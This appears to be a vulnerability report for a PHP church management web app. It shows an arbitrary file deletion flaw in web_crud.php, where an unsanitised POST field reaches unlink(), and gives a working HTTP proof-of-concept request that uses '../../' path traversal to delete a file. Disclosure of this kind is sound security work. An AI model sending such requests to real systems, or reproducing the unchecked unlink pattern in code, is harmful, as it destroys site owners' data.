### Vulnerability file address

In line 381 of `church/admin/app/web_crud.php`, `@unlink("../../assets/images/" . $_POST['old_faq_img']);`,` $_POST['old_faq_img']` parameters have not been restricted, which causes any file to be deleted

```php
if ($_FILES['faqphoto']['tmp_name'] != '') {
            $filepath = "../../assets/images/" . generateUniqueFileName($_FILES["faqphoto"]["name"]);

            if (move_uploaded_file($_FILES["faqphoto"]["tmp_name"], $filepath)) {
                $img2 = basename($filepath);
                @unlink("../../assets/images/" . $_POST['old_faq_img']);
            }
        }
```

### POC

```http
POST /church/admin/app/web_crud.php HTTP/1.1
Host: www.church.net
Connection: close
Cookie: PHPSESSID=hl5noegsdjn1ru7skoi8tmqco3
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Length: 373

------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="update6"

1
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="old_faq_img"

../../13.txt
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="faqphoto";filename="aaa.php"

this is test
------WebKitFormBoundaryTZGvWJmfBtMK9O8p--
```

### Attack results pictures

First, we create a `13.txt` file in the `church/` directory

![image-20250505160420104](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505051604148.png)

Then we execute the above poc to attack

![image-20250505160538028](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505051605059.png)

Files are deleted after the attack is successful

![image-20250505160555872](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505051605912.png)